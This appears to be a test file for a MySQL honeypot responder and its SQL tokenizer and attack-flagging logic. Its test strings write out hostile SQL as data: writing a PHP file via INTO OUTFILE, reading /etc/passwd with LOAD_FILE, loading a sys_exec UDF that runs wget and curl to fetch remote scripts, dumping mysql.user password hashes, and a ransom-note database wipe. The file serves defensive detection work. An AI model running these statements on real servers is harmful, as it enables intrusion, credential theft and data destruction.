"""The canned SQL responder and the tokenizer: shapes, flags, URLs and pathological inputs."""

from __future__ import annotations

import random
import time

from mysql_sensor import sqlish
from mysql_sensor.responder import Err, Ok, Responder, Result, ResultSet, like_match

VERSION = "8.0.43-0ubuntu0.24.04.2"


def make() -> Responder:
    return Responder(
        version=VERSION,
        hostname="srv-db01",
        user="root",
        client_ip="192.0.2.10",
        client_port=40000,
        conn_id=42,
        uptime=lambda: 86400 * 3,
        seed="seed",
    )


def run(r: Responder, sql: str) -> Result:
    stmts = sqlish.split_statements(sqlish.tokenize(sql))
    res: Result = Err(1065, "42000", "Query was empty")
    for stmt in stmts:
        res = r.respond(stmt, sql)
    return res


def rows(res: Result) -> list[tuple[str | None, ...]]:
    assert isinstance(res, ResultSet), res
    return res.rows


def test_version_functions_and_variables() -> None:
    r = make()
    assert rows(run(r, "select version()")) == [(VERSION,)]
    assert rows(run(r, "SELECT @@global.version_comment")) == [("(Ubuntu)",)]
    assert rows(run(r, "select @@version_compile_os, @@lower_case_table_names")) == [("Linux", "0")]
    assert rows(run(r, "select @@autocommit")) == [("1",)]
    res = run(r, "select @@nope")
    assert isinstance(res, Err) and res.code == 1193
    res = run(r, "select frobnicate(1)")
    assert isinstance(res, Err) and res.code == 1305
    assert rows(run(r, "select 1, 'a', null")) == [("1", "a", None)]
    res = run(r, "select version() as v")
    assert isinstance(res, ResultSet) and res.columns[0].name == "v"


def test_sleep_has_bounded_delay() -> None:
    res = run(make(), "select sleep(1000)")
    assert isinstance(res, ResultSet) and res.delay == 5.0 and res.rows == [("0",)]


def test_tables_and_rows() -> None:
    r = make()
    assert isinstance(run(r, "use shop"), Ok)
    assert rows(run(r, "show tables")) == [("customers",), ("orders",), ("products",)]
    res = run(r, "select * from customers limit 5")
    assert isinstance(res, ResultSet) and len(res.rows) == 5
    for row in res.rows:
        assert row[3] is not None and row[3].endswith("@example.com")
        assert row[4] is not None and row[4].startswith("+1-555-01")
    assert len(rows(run(r, "select * from customers"))) == 200  # capped
    assert rows(run(r, "select count(*) from orders")) == [("5310",)]
    assert len(rows(run(r, "select id from products limit 1000"))) == 96
    assert rows(run(r, "select id from products limit 2 offset 3")) == [("4",), ("5",)]
    assert rows(run(r, "select 1 from customers where id = 3 or 1=1 limit 2")) == [("1",), ("1",)]
    res = run(r, "select nosuchcol from customers")
    assert isinstance(res, Err) and res.code == 1054
    res = run(r, "select * from ghosts")
    assert isinstance(res, Err) and res.code == 1146


def test_describe_and_show_create() -> None:
    r = make()
    run(r, "use shop")
    res = run(r, "describe customers")
    assert [x[0] for x in rows(res)][:3] == ["id", "first_name", "last_name"]
    ddl = rows(run(r, "show create table orders"))[0][1]
    assert ddl is not None and ddl.startswith("CREATE TABLE `orders`")


def test_information_schema_and_mysql_user() -> None:
    r = make()
    got = rows(run(r, "select table_name from information_schema.tables where table_schema='shop'"))
    assert got == [("customers",), ("orders",), ("products",)]
    users = rows(run(r, "select user, authentication_string from mysql.user"))
    assert ("root", "") in users
    assert any(u == "mysql.sys" for u, _ in users)


def test_ddl_and_ransomware_flow() -> None:
    r = make()
    res = run(r, "drop database shop")
    assert isinstance(res, Ok) and res.affected == 3
    assert "shop" not in [x[0] for x in rows(run(r, "show databases"))]
    assert isinstance(run(r, "drop database shop"), Err)
    assert isinstance(run(r, "drop database if exists shop"), Ok)
    assert isinstance(run(r, "create database PLEASE_READ_ME"), Ok)
    res = run(r, "create database PLEASE_READ_ME")
    assert isinstance(res, Err) and res.code == 1007
    res = run(r, "create table WARNING (id int)")
    assert isinstance(res, Err) and res.code == 1046  # no database selected
    assert isinstance(run(r, "use PLEASE_READ_ME"), Ok)
    assert isinstance(run(r, "create table WARNING (id int, bitcoin text)"), Ok)
    res = run(r, "insert into WARNING values (1,'a'),(2,'b'),(3,'c')")
    assert isinstance(res, Ok) and res.affected == 3
    assert rows(run(r, "show tables")) == [("WARNING",)]
    assert rows(run(r, "select * from WARNING")) == []
    res = run(r, "create table WARNING (id int)")
    assert isinstance(res, Err) and res.code == 1050
    assert isinstance(run(r, "drop table WARNING"), Ok)
    res = run(r, "drop table WARNING")
    assert isinstance(res, Err) and res.code == 1051
    res = run(r, "drop database mysql")
    assert isinstance(res, Err) and res.code == 1044


def test_creation_limits() -> None:
    r = make()
    for i in range(30):
        run(r, f"create database d{i}")
    assert len(r.dbs) <= 4 + 1 + 20
    run(r, "use d0")
    for i in range(60):
        run(r, f"create table t{i} (a int)")
    assert r.created_tables <= 40
    res = run(r, "create database " + "x" * 80)
    assert isinstance(res, Err)


def test_dangerous_statements_are_refused_like_a_hardened_server() -> None:
    r = make()
    res = run(r, "select 'x' into outfile '/var/www/html/a.php'")
    assert isinstance(res, Err) and res.code == 1290
    res = run(r, "load data infile '/etc/passwd' into table t")
    assert isinstance(res, Err) and res.code == 1290
    res = run(r, "load data local infile '/etc/passwd' into table t")
    assert isinstance(res, Err) and res.code == 3948
    res = run(r, "create function f returns string soname 'lib_mysqludf_sys.so'")
    assert isinstance(res, Err) and res.code == 1126 and "No such file or directory" in res.message
    assert rows(run(r, "select load_file('/etc/passwd')")) == [(None,)]


def test_set_and_misc_ok_packets() -> None:
    r = make()
    for sql in (
        "set names utf8mb4",
        "set autocommit=0",
        "set global general_log = 'ON'",
        "set @x := 'y'",
        "flush privileges",
        "grant all on *.* to 'u'@'%'",
        "create user 'u'@'%' identified by 'p'",
        "begin",
        "commit",
        "kill 5",
    ):
        assert isinstance(run(r, sql), Ok), sql
    assert rows(run(r, "select @x")) == [("y",)]
    assert rows(run(r, "show variables like 'general_log'")) == [("general_log", "ON")]
    res = run(r, "set global nosuch = 1")
    assert isinstance(res, Err) and res.code == 1193


def test_syntax_errors_look_real() -> None:
    r = make()
    res = run(r, "selecct * from x")
    assert isinstance(res, Err) and res.code == 1064
    assert res.message.endswith("near 'selecct * from x' at line 1")
    assert res.message.startswith("You have an error in your SQL syntax; check the manual")
    res = run(r, "")
    assert isinstance(res, Err) and res.code == 1065


def test_show_status_processlist_and_misc() -> None:
    r = make()
    assert ("Uptime", str(86400 * 3)) in rows(run(r, "show status like 'Uptime'"))
    plist = rows(run(r, "show full processlist"))
    assert plist[-1][0] == "42" and plist[-1][2] == "192.0.2.10:40000"
    assert "Uptime: 259200" in r.statistics()


def test_like_matcher() -> None:
    assert like_match("ver%", "version") and like_match("%sion", "version")
    assert like_match("v_rsion", "version") and not like_match("v_rsion", "vrsion")
    assert like_match("%", "") and not like_match("a", "")
    assert like_match("%a%b%c%", "xxaxxbxxcxx") and not like_match("%a%b%c%", "xxaxxcxxbxx")


def test_flags() -> None:
    def flags(sql: str) -> list[str]:
        return sqlish.compute_flags(sqlish.split_statements(sqlish.tokenize(sql)))

    assert flags("SELECT 1 INTO   OUTFILE '/x'") == ["into_outfile"]
    assert flags("select 1 into dumpfile '/x'") == ["into_outfile"]
    assert flags("select load_file('/etc/passwd')") == ["load_file"]
    assert flags("select /*!50000 load_file */ ('/x')") == ["load_file"]  # executable comment
    assert flags("select load_file from t") == []  # a column name, not a call
    assert flags("DROP SCHEMA x") == ["drop_database"]
    assert flags("create function f returns int soname 'a.so'") == ["udf"]
    assert flags("select sys_exec('id')") == ["udf"]
    assert flags("insert into t values ('send 0.1 BTC to recover your data')") == ["ransom_note"]
    assert flags("select 'bitcoin'") == []  # only writing statements are ransom notes
    assert flags("select sleep(5)") == ["sql_delay"]
    assert flags("select user, authentication_string from mysql.user") == ["user_dump"]
    assert flags("show databases") == ["show_databases"]
    assert flags("select * from information_schema.tables") == ["schema_recon"]
    assert flags("grant all on *.* to 'a'@'%'") == ["privilege_change"]
    assert flags("select 'into outfile'") == []


def test_urls() -> None:
    urls = sqlish.find_urls(
        "select sys_exec('cd /tmp;wget http://198.51.100.7/a.sh;curl -O https://203.0.113.5:8080/b')"
    )
    assert ("http://198.51.100.7/a.sh", "wget") in urls
    assert ("https://203.0.113.5:8080/b", "curl") in urls
    assert sqlish.find_urls("select 'http://'") == []
    many = sqlish.find_urls(" ".join(f"http://192.0.2.{i % 250}/p{i}" for i in range(500)))
    assert len(many) <= sqlish.MAX_URLS


def test_tokenizer_comments_and_quotes() -> None:
    toks = sqlish.tokenize("select/**/1 -- c\n,'a''b', `x y`, \"q\\\"z\" # tail\n/*! ,2 */")
    assert [t.text for t in toks] == [
        "select",
        "1",
        ",",
        "a''b",
        ",",
        "x y",
        ",",
        'q\\"z',
        ",",
        "2",
    ]
    assert len(sqlish.split_statements(sqlish.tokenize("select ';'; select 2;;"))) == 2


# --- pathological inputs: linear time ------------------------------------------------------

PATHOLOGICAL = [
    "'" * 65_000,
    "(" * 65_000,
    "select " + ",".join(["1"] * 20_000),
    "select " + "a" * 65_000,
    "/*" * 30_000,
    "-- " * 20_000,
    "select '" + "\\" * 60_000,
    "insert into t values " + ",".join(["(1,'a')"] * 8000),
    "select " + "@" * 60_000,
    "create table t (" + ",".join(f"c{i} int" for i in range(8000)) + ")",
    "select * from a where " + " and ".join(["x = 1"] * 8000),
    "http://" * 9000,
    "`" * 65_000,
    "show " + "%" * 60_000,
]


def test_pathological_inputs_run_in_bounded_time() -> None:
    for sql in PATHOLOGICAL:
        r = make()
        start = time.perf_counter()
        stmts = sqlish.split_statements(sqlish.tokenize(sql))
        sqlish.compute_flags(stmts)
        sqlish.find_urls(sql)
        for stmt in stmts[:5]:
            r.respond(stmt, sql)
        assert time.perf_counter() - start < 0.5, sql[:30]


def test_like_matcher_is_bounded() -> None:
    start = time.perf_counter()
    assert not like_match("%a" * 60 + "b", "a" * 5000)
    assert time.perf_counter() - start < 0.2


def test_random_garbage_never_raises() -> None:
    rng = random.Random(3)
    words = ["select", "from", "where", "show", "create", "table", "(", ")", ",", "'", "*", "limit",
             "insert", "into", "values", "drop", "database", "set", "@", "@@", "use", "describe", "/*"]  # fmt: skip
    for _ in range(3000):
        sql = " ".join(rng.choice(words) for _ in range(rng.randrange(1, 14)))
        r = make()
        for stmt in sqlish.split_statements(sqlish.tokenize(sql)):
            res = r.respond(stmt, sql)
            assert isinstance(res, (Ok, Err, ResultSet))
